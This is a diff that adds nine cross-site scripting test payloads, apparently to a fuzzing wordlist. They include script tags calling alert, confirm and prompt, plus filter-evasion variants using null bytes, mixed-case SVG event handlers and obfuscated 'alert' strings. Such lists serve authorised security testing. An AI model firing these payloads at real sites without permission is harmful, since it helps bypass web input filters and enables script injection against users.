@@ -1,0 +1,9 @@
+<script>/&/-alert(1)</script>
+<script>/&/-alert(1)</script>
+%00%00%00%00%00%00%00<script>alert(1)</script>
+<sVg OnPointerEnter="location=javas+cript:ale+rt%2+81%2+9">
+<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click 
+<script>alert.call(null,1)</script>   (alert.call(%20, "XSS");)
+<script>confirm.call(null,1)</script>
+<script>prompt.call(null,1)</script>
+<script>alert.apply(null, [1])</script>
